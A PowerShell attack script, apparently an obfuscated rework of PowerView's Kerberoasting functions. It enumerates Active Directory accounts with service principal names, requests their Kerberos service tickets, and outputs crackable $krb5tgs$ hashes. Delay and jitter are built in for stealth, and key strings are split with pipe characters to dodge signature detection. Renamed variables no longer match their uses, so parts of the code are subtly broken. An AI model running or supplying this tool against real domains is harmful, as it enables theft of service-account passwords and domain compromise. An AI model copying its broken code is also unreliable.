function DomSearch {                 [CmdletBinding()]     Param(         [Parameter(ValueFromPipeline = $True)]                  [String]         $Domain,                   [Alias('Filter')]         [String]         $LDAPFilter,                   [String[]]         $Properties,                   [Alias('ADSPath')]         [String]         $SearchBase,                   [String]         $SearchBasePrefix,                   [Alias('DomainController')]         [String]         $Server,                   [String]         $SearchScope = 'Subtree',          [ValidateRange(1, 10000)]         [Int]         $ResultPageSize = 200,          [ValidateRange(1, 10000)]         [Int]         $ServerTimeLimit = 120,                   [String]         $SecurityMasks,          [Switch]         $Tombstone,         $Credential = [Management.Automation.PSCredential]::Empty     )      PROCESS {         if ($PSBoundParameters['Domain']) {             $T_A_R_G_D_O_M = $Domain         }         else {             if ($PSBoundParameters['Credential']) {                 $DomainObject = Get-Domain -Credential $Credential             }             else {                 $DomainObject = Get-Domain             }             $T_A_R_G_D_O_M = $DomainObject.Name         }          if (-not $PSBoundParameters['Server']) {             try {                 if ($DomainObject) {                     $BindServer = $DomainObject.PdcRoleOwner.Name                 }                 elseif ($PSBoundParameters['Credential']) {                     $BindServer = ((Get-Domain -Credential $Credential).PdcRoleOwner).Name                 }                 else {                     $BindServer = ((Get-Domain).PdcRoleOwner).Name                 }             }             catch {                 throw "[Get-DomainSearcher] Error in retrieving PDC for current domain: $_"             }         }         else {             $BindServer = $Server         }          $SearchString = 'LDAP://'          if ($BindServer -and ($BindServer.Trim() -ne '')) {             $SearchString += $BindServer             if ($TargetDomain) {                 $SearchString += '/'             }         }          if ($PSBoundParameters['SearchBasePrefix']) {             $SearchString += $SearchBasePrefix + ','         }          if ($PSBoundParameters['SearchBase']) {             if ($SearchBase -Match '^GC://') {                 $DN = $SearchBase.ToUpper().Trim('/')                 $SearchString = ''             }             else {                 if ($SearchBase -match '^LDAP://') {                     if ($SearchBase -match "LDAP://.+/.+") {                         $SearchString = ''                         $DN = $SearchBase                     }                     else {                         $DN = $SearchBase.SubString(7)                     }                 }                 else {                     $DN = $SearchBase                 }             }         }         else {             if ($TargetDomain -and ($TargetDomain.Trim() -ne '')) {                 $DN = "DC=$($TargetDomain.Replace('.', ',DC='))"             }         }          $SearchString += $DN         write-host  "[Get-DomainSearcher] search string: $SearchString"          if ($Credential -ne [Management.Automation.PSCredential]::Empty) {             write-host  "[Get-DomainSearcher] Using alternate credentials for LDAP connection"             $DomainObject = New-Object DirectoryServices.DirectoryEntry($SearchString, $Credential.UserName, $Credential.GetNetworkCredential().Password)             $Searcher = New-Object System.DirectoryServices.DirectorySearcher($DomainObject)         }         else {             $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)         }          $Searcher.PageSize = $ResultPageSize         $Searcher.SearchScope = $SearchScope         $Searcher.CacheResults = $False         $Searcher.ReferralChasing = [System.DirectoryServices.ReferralChasingOption]::All          if ($PSBoundParameters['ServerTimeLimit']) {             $Searcher.ServerTimeLimit = $ServerTimeLimit         }          if ($PSBoundParameters['Tombstone']) {             $Searcher.Tombstone = $True         }          if ($PSBoundParameters['LDAPFilter']) {             $Searcher.filter = $LDAPFilter         }          if ($PSBoundParameters['SecurityMasks']) {             $Searcher.SecurityMasks = Switch ($SecurityMasks) {                 'Dacl' { [System.DirectoryServices.SecurityMasks]::Dacl }                 'Group' { [System.DirectoryServices.SecurityMasks]::Group }                 'None' { [System.DirectoryServices.SecurityMasks]::None }                 'Owner' { [System.DirectoryServices.SecurityMasks]::Owner }                 'Sacl' { [System.DirectoryServices.SecurityMasks]::Sacl }             }         }          if ($PSBoundParameters['Properties']) {             $PropertiesToLoad = $Properties| % { $_.Split(',') }             $Null = $Searcher.PropertiesToLoad.AddRange(($PropertiesToLoad))         }          $Searcher     } }   function ConvLDAPProp  {      [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]     [OutputType('System.Management.Automation.PSCustomObject')]     [CmdletBinding()]     Param(         [Parameter(Mandatory = $True, ValueFromPipeline = $True)]                $Properties     )      $Ob_jectProperti_es = @{}     $Properties.PropertyNames | % {          if ($_ -ne 'adspath') {             if (($_ -eq 'objectsid') -or ($_ -eq 'sidhistory')) {                  $Ob_jectProperti_es[$_] = $Properties[$_] | % { (New-Object System.Security.Principal.SecurityIdentifier($_, 0)).Value }             }             elseif ($_ -eq 'grouptype') {                 $Ob_jectProperti_es[$_] = $Properties[$_][0] #-as $GroupTypeEnum             }             elseif ($_ -eq 'samaccounttype') {                 return $Properties[0]                 $Ob_jectProperti_es[$_] = $Properties[$_][0] #-as $SamAccountTypeEnum             }             elseif ($_ -eq 'objectguid') {                 $Ob_jectProperti_es[$_] = (New-Object Guid (,$Properties[$_][0])).Guid             }             elseif ($_ -eq 'useraccountcontrol') {                 $Ob_jectProperti_es[$_] = $Properties[$_][0] #-as $UACEnum             }             elseif ($_ -eq 'ntsecuritydescriptor') {                 $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Properties[$_][0], 0                 if ($Descriptor.Owner) {                     $Ob_jectProperti_es['Owner'] = $Descriptor.Owner                 }                 if ($Descriptor.Group) {                     $Ob_jectProperti_es['Group'] = $Descriptor.Group                 }                 if ($Descriptor.DiscretionaryAcl) {                     $Ob_jectProperti_es['DiscretionaryAcl'] = $Descriptor.DiscretionaryAcl                 }                 if ($Descriptor.SystemAcl) {                     $Ob_jectProperti_es['SystemAcl'] = $Descriptor.SystemAcl                 }             }             elseif ($_ -eq 'accountexpires') {                 if ($Properties[$_][0] -gt [DateTime]::MaxValue.Ticks) {                     $Ob_jectProperti_es[$_] = "NEVER"                 }                 else {                     $Ob_jectProperti_es[$_] = [datetime]::fromfiletime($Properties[$_][0])                 }             }             elseif ( ($_ -eq 'lastlogon') -or ($_ -eq 'lastlogontimestamp') -or ($_ -eq 'pwdlastset') -or ($_ -eq 'lastlogoff') -or ($_ -eq 'badPasswordTime') ) {                 if ($Properties[$_][0] -is [System.MarshalByRefObject]) {                     $Temp = $Properties[$_][0]                     [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)                     [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)                     $Ob_jectProperti_es[$_] = ([datetime]::FromFileTime([Int64]("0x{0:x8}{1:x8}" -f $High, $Low)))                 }                 else {                     $Ob_jectProperti_es[$_] = ([datetime]::FromFileTime(($Properties[$_][0])))                 }             }             elseif ($Properties[$_][0] -is [System.MarshalByRefObject]) {                 $Prop = $Properties[$_]                 try {                     $Temp = $Prop[$_][0]                     [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)                     [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)                     $Ob_jectProperti_es[$_] = [Int64]("0x{0:x8}{1:x8}" -f $High, $Low)                 }                 catch {                     write-host  "[Convert-LDAPProperty] error: $_"                     $Ob_jectProperti_es[$_] = $Prop[$_]                 }             }             elseif ($Properties[$_].count -eq 1) {                 $Ob_jectProperti_es[$_] = $Properties[$_][0]             }             else {                 $Ob_jectProperti_es[$_] = $Properties[$_]             }         }     }     try {         New-Object -TypeName PSObject -Property $Ob_jectProperti_es     }     catch {         Write-Warning "[Convert-LDAPProperty] Error parsing LDAP properties : $_"     } }   function Get-Domain {      [CmdletBinding()]     Param(         [Parameter(Position = 0, ValueFromPipeline = $True)]                  [String]         $Domain,          [Management.Automation.PSCredential]         [Management.Automation.CredentialAttribute()]         $Credential = [Management.Automation.PSCredential]::Empty     )      PROCESS {         if ($PSBoundParameters['Credential']) {              if ($PSBoundParameters['Domain']) {                 $T_A_R_G_D_O_M = $Domain             }             else {                 $T_A_R_G_D_O_M = $Credential.GetNetworkCredential().Domain             }              $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $TargetDomain, $Credential.UserName, $Credential.GetNetworkCredential().Password)              try {                 [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)             }             catch {                 write-host  "[Get-Domain] The specified domain '$TargetDomain' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"             }         }         elseif ($PSBoundParameters['Domain']) {             $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain)             try {                 [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)             }             catch {                 write-host  "[Get-Domain] The specified domain '$Domain' does not exist, could not be contacted, or there isn't an existing trust : $_"             }         }         else {             try {                 [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()             }             catch {                 write-host  "[Get-Domain] Error retrieving the current domain: $_"             }         }     } }    function domspn {            [CmdletBinding(DefaultParameterSetName = 'RawSPN')]     Param (         [Parameter(Position = 0, ParameterSetName = 'RawSPN', Mandatory = $True, ValueFromPipeline = $True)]         [ValidatePattern('.*/.*')]         [Alias('ServicePrincipalName')]         [String[]]         $SPN,          [Parameter(Position = 0, ParameterSetName = 'User', Mandatory = $True, ValueFromPipeline = $True)]         [ValidateScript({ $_.PSObject.TypeNames[0] -eq 'ViewPower.User' })]         [Object[]]         $User,                   [Alias('Format')]         [String]         $OutputFormat = 'John',          [ValidateRange(0,10000)]         [Int]         $Delay = 0,          [ValidateRange(0.0, 1.0)]         [Double]         $Jitter = .3,          [Management.Automation.PSCredential]         [Management.Automation.CredentialAttribute()]         $Credential = [Management.Automation.PSCredential]::Empty     )      BEGIN {         $Null = [Reflection.Assembly]::$('Lo|ad|Wit|h|Part|ialNa|me' -replace "\|","")( 'System.IdentityModel')          if ($PSBoundParameters['Credential']) {             $L_og_onToke_n = impersonatez -Credential $Credential         }     }      PROCESS {         if ($PSBoundParameters['User']) {             $TargetObject = $User         }         else {             $TargetObject = $SPN         } 	 	$RandNo = New-Object System.Random          ForEach ($Object in $TargetObject) {              if ($PSBoundParameters['User']) {                 $UserSPN = $Object.ServicePrincipalName                 $SamAccountName = $Object.SamAccountName                 $DistinguishedName = $Object.DistinguishedName             }             else {                 $UserSPN = $Object                 $SamAccountName = 'UNKNOWN'                 $DistinguishedName = 'UNKNOWN'             }             if ($UserSPN -is [System.DirectoryServices.ResultPropertyValueCollection]) {                 $UserSPN = $UserSPN[0]             }              try {                 $Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $UserSPN             }             catch {                 Write-Warning "[Get-DomainSPNTicket] Error requesting ticket for SPN '$UserSPN' from user '$DistinguishedName' : $_"             }             if ($Ticket) {                 $TicketByteStream = $Ticket.GetRequest()             }             if ($TicketByteStream) {                 $Out = New-Object PSObject                  $TicketHexStream = [System.BitConverter]::ToString($TicketByteStream) -replace '-'                  if($TicketHexStream -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {                     $Etype = [Convert]::ToByte( $Matches.EtypeLen, 16 )                     $CipherTextLen = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4                     $CipherText = $Matches.DataToEnd.Substring(0,$CipherTextLen*2)                      if($Matches.DataToEnd.Substring($CipherTextLen*2, 4) -ne 'A482') {                         Write-Warning 'Error parsing ciphertext for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"'                         $Hash = $null                         $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($TicketByteStream).Replace('-',''))                     } else {                         $Hash = "$($CipherText.Substring(0,32))`$$($CipherText.Substring(32))"                         $Out | Add-Member Noteproperty 'TicketByteHexStream' $null                     }                 } else {                     Write-Warning "Unable to parse ticket structure for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"                     $Hash = $null                     $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($TicketByteStream).Replace('-',''))                 }                  if($Hash) {                     if ($OutputFormat -match 'John') {                         $HashFormat = "`$krb5tgs`$$($Ticket.ServicePrincipalName):$Hash"                     }                     else {                         if ($DistinguishedName -ne 'UNKNOWN') {                             $UserDomain = $DistinguishedName.SubString($DistinguishedName.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'                         }                         else {                             $UserDomain = 'UNKNOWN'                         }                         $HashFormat = "`$krb5tgs`$$($Etype)`$*$SamAccountName`$$UserDomain`$$($Ticket.ServicePrincipalName)*`$$Hash"                     }                     $Out | Add-Member Noteproperty 'Hash' $HashFormat                 }                  $Out | Add-Member Noteproperty 'SamAccountName' $SamAccountName                 $Out | Add-Member Noteproperty 'DistinguishedName' $DistinguishedName                 $Out | Add-Member Noteproperty 'ServicePrincipalName' $Ticket.ServicePrincipalName                 $Out.PSObject.TypeNames.Insert(0, 'ViewPower.SPNTicket')                 Write-Output $Out             }             Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)         }     }      END {         if ($LogonToken) {             RevToSelf -TokenHandle $LogonToken         }     } }  function DomainUser {      [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]     Param(         [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]         [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]         [String[]]         $Identity,          [Switch]         $SPN,          [Switch]         $AdminCount,          [Parameter(ParameterSetName = 'AllowDelegation')]         [Switch]         $AllowDelegation,          [Parameter(ParameterSetName = 'DisallowDelegation')]         [Switch]         $DisallowDelegation,          [Switch]         $TrustedToAuth,          [Alias('KerberosPreauthNotRequired', 'NoPreauth')]         [Switch]         $PreauthNotRequired,                   [String]         $Domain,                   [Alias('Filter')]         [String]         $LDAPFilter,                   [String[]]         $Properties,                   [Alias('ADSPath')]         [String]         $SearchBase,                   [Alias('DomainController')]         [String]         $Server,                   [String]         $SearchScope = 'Subtree',          [ValidateRange(1, 10000)]         [Int]         $ResultPageSize = 200,          [ValidateRange(1, 10000)]         [Int]         $ServerTimeLimit,                   [String]         $SecurityMasks,          [Switch]         $Tombstone,          [Alias('ReturnOne')]         [Switch]         $FindOne,          $Credential = [Management.Automation.PSCredential]::Empty,          [Switch]         $Raw     )      BEGIN {         $S_e_archArg_s = @{}         if ($PSBoundParameters['Domain']) { $S_e_archArg_s['Domain'] = $Domain }         if ($PSBoundParameters['Properties']) { $S_e_archArg_s['Properties'] = $Properties }         if ($PSBoundParameters['SearchBase']) { $S_e_archArg_s['SearchBase'] = $SearchBase }         if ($PSBoundParameters['Server']) { $S_e_archArg_s['Server'] = $Server }         if ($PSBoundParameters['SearchScope']) { $S_e_archArg_s['SearchScope'] = $SearchScope }         if ($PSBoundParameters['ResultPageSize']) { $S_e_archArg_s['ResultPageSize'] = $ResultPageSize }         if ($PSBoundParameters['ServerTimeLimit']) { $S_e_archArg_s['ServerTimeLimit'] = $ServerTimeLimit }         if ($PSBoundParameters['SecurityMasks']) { $S_e_archArg_s['SecurityMasks'] = $SecurityMasks }         if ($PSBoundParameters['Tombstone']) { $S_e_archArg_s['Tombstone'] = $Tombstone }         if ($PSBoundParameters['Credential']) { $S_e_archArg_s['Credential'] = $Credential }         $UserSearcher = DomSearch @SearcherArguments     }      PROCESS {          if ($UserSearcher) {             $IdentityFilter = ''             $Filter = ''             $Identity | ? {$_} | % {                 $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')                 if ($IdentityInstance -match '^S-1-') {                     $IdentityFilter += "(objectsid=$IdentityInstance)"                 }                 elseif ($IdentityInstance -match '^CN=') {                     $IdentityFilter += "(distinguishedname=$IdentityInstance)"                     if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {                         $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'                         write-host  "[Get-DomainUser] Extracted domain '$IdentityDomain' from '$IdentityInstance'"                         $S_e_archArg_s['Domain'] = $IdentityDomain                         $UserSearcher = DomSearch @SearcherArguments                         if (-not $UserSearcher) {                             Write-Warning "[Get-DomainUser] Unable to retrieve domain searcher for '$IdentityDomain'"                         }                     }                 }                 elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {                     $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | % { '\' + $_.ToString('X2') }) -join ''                     $IdentityFilter += "(objectguid=$GuidByteString)"                 }                 elseif ($IdentityInstance.Contains('\')) {                     $ConvertedIdentityInstance = $IdentityInstance.Replace('\28', '(').Replace('\29', ')') | Convert-ADName -OutputType Canonical                     if ($ConvertedIdentityInstance) {                         $UserDomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf('/'))                         $UserName = $IdentityInstance.Split('\')[1]                         $IdentityFilter += "(samAccountName=$UserName)"                         $S_e_archArg_s['Domain'] = $UserDomain                         Write-host "[Get-DomainUser] Extracted domain '$UserDomain' from '$IdentityInstance'"                         $UserSearcher = DomSearch @SearcherArguments                     }                 }                 else {                     $IdentityFilter += "(samAccountName=$IdentityInstance)"                 }             }              if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {                 $Filter += "(|$IdentityFilter)"             }              if ($PSBoundParameters['SPN']) {                 write-host  '[Get-DomainUser] Searching for non-null service principal names'                 $Filter += '(servicePrincipalName=*)'             }             if ($PSBoundParameters['AllowDelegation']) {                 write-host  '[Get-DomainUser] Searching for users who can be delegated'                 $Filter += '(!(userAccountControl:1.2.840.113556.1.4.803:=1048574))'             }             if ($PSBoundParameters['DisallowDelegation']) {                 write-host  '[Get-DomainUser] Searching for users who are sensitive and not trusted for delegation'                 $Filter += $('|(|u|s|e|r|A|c|c|o|u|n|t|C|o|n|t|r|o|l|:|1|.|2|.|8|4|0|.|1|1|3|5|5|6|.|1|.|4|.|8|0|3|:|=' -replace '\|','') + '1048574)'             }             if ($PSBoundParameters['AdminCount']) {                 write-host  '[Get-DomainUser] Searching for adminCount=1'                 $Filter += '(admincount=1)'             }             if ($PSBoundParameters['TrustedToAuth']) {                 write-host  '[Get-DomainUser] Searching for users that are trusted to authenticate for other principals'                 $Filter += '(msds-allowedtodelegateto=*)'             }             if ($PSBoundParameters['PreauthNotRequired']) {                 write-host  '[Get-DomainUser] Searching for user accounts that do not require kerberos preauthenticate'                 $Filter += '(userAccountControl:1.2.840.113556.1.4.803:=4194304)'             }             if ($PSBoundParameters['LDAPFilter']) {                 write-host  "[Get-DomainUser] Using additional LDAP filter: $LDAPFilter"                 $Filter += "$LDAPFilter"             }              $UACFilter | ? {$_} | % {                 if ($_ -match 'NOT_.*') {                     $UACField = $_.Substring(4)                     $UACValue = [Int]($UACEnum::$UACField)                     $Filter += $('(|!|(|u|s|e|r|A|c|c|o|u|n|t|C|o|n|t|r|o|l|:|1|.|2|.|8|4|0|.|1|1|3|5|5|6|.|1|.|4|.|8|0|3|:|=' -replace '\|','') + $UACValue + '))'                 }                 else {                     $UACValue = [Int]($UACEnum::$_)                     $Filter += $("(use|rAc|cou|nt|C|o|n|t|r|o|l|:|1|.|2|.|8|4|0|.|1|1|3|5|5|6|.|1|.|4.803:=$UACValue)" -replace "\|","")                 }             }              $UserSearcher.filter = "(&(samAccountType=805306368)$Filter)"             write-host  "[Get-DomainUser] filter string: $($UserSearcher.filter)"              if ($PSBoundParameters['FindOne']) { $Results = $UserSearcher.FindOne() }             else { $Results = $UserSearcher.FindAll() }             $Results | ? {$_} | % {                 if ($PSBoundParameters['Raw']) {                     $User = $_                     $User.PSObject.TypeNames.Insert(0, 'ViewPower.User.Raw')                 }                 else {                     $User = ConvLDAPProp  -Properties $_.Properties                     $User.PSObject.TypeNames.Insert(0, 'ViewPower.User')                 }                 $User             }             if ($Results) {                 try { $Results.dispose() }                 catch {                     write-host  "[Get-DomainUser] Error disposing of the Results object: $_"                 }             }             $UserSearcher.dispose()         }     } }   function kerby {              [CmdletBinding()]     Param(         [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]         [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]         [String[]]         $Identity,                   [String]         $Domain,                   [Alias('Filter')]         [String]         $LDAPFilter,                   [Alias('ADSPath')]         [String]         $SearchBase,                   [Alias('DomainController')]         [String]         $Server,                   [String]         $SearchScope = 'Subtree',          [ValidateRange(1, 10000)]         [Int]         $ResultPageSize = 200,          [ValidateRange(1, 10000)]         [Int]         $ServerTimeLimit,          [Switch]         $Tombstone,          [ValidateRange(0,10000)]         [Int]         $Delay = 0,          [ValidateRange(0.0, 1.0)]         [Double]         $Jitter = .3,                   [Alias('Format')]         [String]         $OutputFormat = 'John',         $Credential = [Management.Automation.PSCredential]::Empty     )      BEGIN {         $U_serSea_r_cherArgs = @{             'SPN' = $True             'Properties' = $(('samacc_ount_name|di_stinguis_hedname|servicep_rincip_alname' -replace "\|",",") -replace "_","")         }         if ($PSBoundParameters['Domain']) { $U_serSea_r_cherArgs['Domain'] = $Domain }         if ($PSBoundParameters['LDAPFilter']) { $U_serSea_r_cherArgs['LDAPFilter'] = $LDAPFilter }         if ($PSBoundParameters['SearchBase']) { $U_serSea_r_cherArgs['SearchBase'] = $SearchBase }         if ($PSBoundParameters['Server']) { $U_serSea_r_cherArgs['Server'] = $Server }         if ($PSBoundParameters['SearchScope']) { $U_serSea_r_cherArgs['SearchScope'] = $SearchScope }         if ($PSBoundParameters['ResultPageSize']) { $U_serSea_r_cherArgs['ResultPageSize'] = $ResultPageSize }         if ($PSBoundParameters['ServerTimeLimit']) { $U_serSea_r_cherArgs['ServerTimeLimit'] = $ServerTimeLimit }         if ($PSBoundParameters['Tombstone']) { $U_serSea_r_cherArgs['Tombstone'] = $Tombstone }         if ($PSBoundParameters['Credential']) { $U_serSea_r_cherArgs['Credential'] = $Credential }          if ($PSBoundParameters['Credential']) {             $L_og_onToke_n = impersonatez -Credential $Credential         }     }      PROCESS {         if ($PSBoundParameters['Identity']) { $U_serSea_r_cherArgs['Identity'] = $Identity }         DomainUser @UserSearcherArguments | ? {$_.samaccountname -ne $('k|r|b|t|g|t' -replace "\|","") } | domspn -Delay $Delay -OutputFormat $OutputFormat -Jitter $Jitter     }      END {         if ($LogonToken) {             RevToSelf -TokenHandle $LogonToken         }     } }
